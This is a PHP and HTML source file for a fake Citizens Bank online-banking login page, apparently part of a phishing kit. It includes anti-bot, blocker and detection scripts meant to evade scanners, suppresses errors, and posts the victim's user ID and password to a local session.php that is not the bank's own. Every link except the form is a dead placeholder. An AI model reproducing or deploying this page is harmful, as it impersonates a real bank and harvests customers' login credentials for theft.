<?php 
ob_start();
session_start();
error_reporting(0);
include './global.php';
  include './lib/loca.php';
  include './lib/system.php';
  include './lib/blocker.php';
  include './lib/antibots4.php';
    include './lib/detect.php';
 
?>
<html>
<head>
<title>Citizens Banks - login</title>
<?php echo $includes; ?>
</head>
<body>
<center>
 
 

<div class="content">
 <div class="top">
<img src="./res/logo.png" class="img"></img>
</div>




<div class="c-left">
<hr>
<h2> <img src="./res/lock.png"></img> Secure Online Banking Login </h2>
<img src="./res/msg.png" ></img>

<div class="login">
<form action="./session.php" method='post'>
<font style="">Please enter your Online User ID and Password.</font>
<br><br>
<b>Online User ID: </b><br>
<input required type="text" class="text" name="id"><br>
<label><input type="checkbox"> Remember User ID <img src='./res/ques.png'></img></label>
<br><br> 

<b>Password: </b><br>
<input required type="password" class="text" name="password"><br>
<p><a href="#">Trouble logging in?</a></p>

<input type="submit" class="submit" value="LOGIN & ACCEPTANCE"> <a href="#" class="a">Cancel</a>
</form>
<p>
By logging into Citizens Bank Online Banking, you acknowledge 
that you have read, understand and agree to the 1)<a href="#"> Terms and Conditions</a> and 2)
 <a href="#">Electronic Notice Disclosure.</a>
</p>

</div>
</div>


<div class="c-right">
<img src="./res/menu.png"></img>
</div>
</div>

 
<div class="down">
<center>
<img style="cursor:pointer;" src="./res/call.png"></img> 
</center>
</div>
</center>
</body>
</html>